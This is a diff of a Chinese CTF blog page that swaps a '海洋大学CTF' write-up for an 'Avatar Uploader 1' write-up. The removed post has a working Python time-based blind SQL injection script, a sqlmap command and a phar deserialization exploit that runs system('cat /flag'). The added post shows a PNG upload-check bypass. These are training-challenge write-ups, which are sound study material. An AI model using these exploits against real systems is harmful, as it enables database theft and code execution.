@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>海洋大学CTF - 1__/\/のblog</title>
+  <title>Avatar Uploader 1 - 1__/\/のblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -164,12 +164,12 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0014.png') no-repeat center center;
+         style="background: url('/img/0015.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="海洋大学CTF">
+            <span class="h2" id="subtitle" title="Avatar Uploader 1">
               
             </span>
 
@@ -179,8 +179,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-05-23 23:14" pubdate>
-        2021年5月23日 晚上
+      <time datetime="2021-05-24 22:43" pubdate>
+        2021年5月24日 晚上
       </time>
     </span>
   
@@ -191,7 +191,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      746 字
+      388 字
     </span>
   
 
@@ -201,7 +201,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      24
+      13
        分钟
     </span>
   
@@ -235,123 +235,69 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">海洋大学CTF</h1>
+            <h1 style="display: none">Avatar Uploader 1</h1>
             
             <div class="markdown-body">
-              <h2 id="合成大晦气"><a href="#合成大晦气" class="headerlink" title="合成大晦气"></a>合成大晦气</h2><p>js里找到flag    </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png" srcset="/img/loading.gif">      </p>
-<h2 id="白给密码"><a href="#白给密码" class="headerlink" title="白给密码"></a>白给密码</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png" srcset="/img/loading.gif">    </p>
-<p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png" srcset="/img/loading.gif">        </p>
-<h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> base64
-<span class="hljs-keyword">import</span> datetime
-
-url=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>
-
-flag=<span class="hljs-string">&#x27;&#x27;</span>
-
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):
-    s=<span class="hljs-number">30</span>
-    l=<span class="hljs-number">127</span>
-    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>
-    <span class="hljs-keyword">while</span>(s&lt;l):
-        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>
-        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>
-        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>
-        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
-        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))
-        payl=<span class="hljs-built_in">str</span>(pay)
-        print(payload)
-        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;
-        time1=datetime.datetime.now()
-        re=requests.post(url=url,data=data)
-        time2=datetime.datetime.now()
-        tem=(time2-time1).seconds
-        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):
-            s=mid+<span class="hljs-number">1</span>
-        <span class="hljs-keyword">else</span>:
-            l=mid
-        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>
-    flag+=<span class="hljs-built_in">chr</span>(mid)
-    print(flag)</code></pre></div></code></pre>
-<p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p>
-<p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p>
-<p>得到的flag  </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png" srcset="/img/loading.gif">     </p>
-<p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p>
-<h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p>
+              <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>打开环境  </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/ec5696d2927c25ee.png" srcset="/img/loading.gif"><br>先随便输个进去看看<br><img src="https://ftp.bmp.ovh/imgs/2021/05/5c988c69bedf52e1.png" srcset="/img/loading.gif">     </p>
+<p>文件上传   </p>
+<p>尝试了几下，感觉没戏，只让上传PNG    </p>
+<p>看下WP<br>给了源码    </p>
+<p><code>upload.php</code>    </p>
 <div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);
-    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];
-    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);
-    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;
-    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))
-    &#123;
-        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;
+error_reporting(<span class="hljs-number">0</span>);
 
-            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123; 
-                mkdir($filePath);    
-            &#125;
-            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));
+<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);
+<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);
+<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);
 
-            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);
-        &#125;
-        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;
-            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;
-                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;
-            &#125;
-            <span class="hljs-keyword">else</span>&#123;
-                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;
-            &#125;
-        &#125;
-        <span class="hljs-keyword">else</span>&#123;
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);
-        &#125;
+$session = <span class="hljs-keyword">new</span> SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
 
-    &#125;
-
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
-<p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p>
-<p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png" srcset="/img/loading.gif">     </p>
-<p>git下来<code>secret.php</code>    </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png" srcset="/img/loading.gif">      </p>
-<p>一个类，eval命令执行    </p>
-<p>但没有序列化，反序列化的点    </p>
-<p><code>phar://</code>反序列化     </p>
-<p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p>
-<p>生成phar文件      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;
-        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;
+<span class="hljs-comment">// check whether file is uploaded</span>
+<span class="hljs-keyword">if</span> (!file_exists($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;
+<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);
 &#125;
-$a=<span class="hljs-keyword">new</span> TestObject();
 
+<span class="hljs-comment">// check file size</span>
+<span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;
+<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);
+&#125;
 
-$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.phar文件</span>
-$phar-&gt;startBuffering();
-$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>
-$phar-&gt;setMetadata($a); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>
-$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>
-$phar-&gt;stopBuffering();
+<span class="hljs-comment">// check file type</span>
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$type = finfo_file($finfo, $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);
+finfo_close($finfo);
+<span class="hljs-keyword">if</span> (!in_array($type, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;
+<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);
+&#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
-<p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">// check file width/height</span>
+$size = getimagesize($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);
+<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || $size[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;
+<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);
+&#125;
+<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;
+<span class="hljs-comment">// I hope this never happens...</span>
+<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);
+&#125;
 
-$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;
-$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//以二进制打开文件</span>
-$content=fread($fp,filesize($path));  <span class="hljs-comment">//读取文件</span>
-$content=base64_encode($content);
+<span class="hljs-comment">// ok</span>
+$filename = bin2hex(random_bytes(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;
+move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . $filename);
 
-<span class="hljs-keyword">echo</span> $content;</code></pre></div></code></pre>
-<p>上传    </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png" srcset="/img/loading.gif">      </p>
-<p>访问     </p>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png" srcset="/img/loading.gif"></p>
+$session-&gt;set(<span class="hljs-string">&#x27;avatar&#x27;</span>, $filename);
+flash(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);
+redirect(<span class="hljs-string">&#x27;/&#x27;</span>);</code></pre></div></code></pre>
+<p><code>getimagesize</code>函数返回的是一个数组     </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/856b33eae66eb5e9.png" srcset="/img/loading.gif">      </p>
+<p><code>[0]</code>和<code>[1]</code>分别是宽度和高度<br><code>[2]</code>是图片的类型    </p>
+<div class="hljs"><pre><code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP       
+按此顺序的编号1=&gt;GIF、3=&gt;PNG     </code></pre></div>
+<p>按源码的要求，需要<code>finfo_file()</code>为<code>imag/png</code>；而<code>getimagesize</code>得到的<code>$size[2]!==IMAGETYPE_PNG</code>       </p>
+<p><code>finfo_file()</code>识别PNG文件十六进制下的第一行，删掉剩余的数据即可绕过<code>getimagesize()</code>    </p>
+<p>所以用<code>winhex</code>对文件处理<br><img src="https://ftp.bmp.ovh/imgs/2021/05/cef90b357e70f2a4.png" srcset="/img/loading.gif">      </p>
+<p>上传后即可得到flag   </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/cc52aa2d9fdf817e.png" srcset="/img/loading.gif"></p>
 
             </div>
             <hr>
@@ -377,7 +323,7 @@ $content=base64_encode($content);
                     
                       <a class="hover-with-bg" href="/tags/php/">php</a>
                     
-                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
+                      <a class="hover-with-bg" href="/tags/upload/">upload</a>
                     
                   </div>
                 
@@ -390,18 +336,12 @@ $content=base64_encode($content);
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/05/24/BUU88/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Avatar Uploader 1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/05/19/BUU87/">
-                        <span class="hidden-mobile">GetShell</span>
+                      <a href="/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/">
+                        <span class="hidden-mobile">海洋大学CTF</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
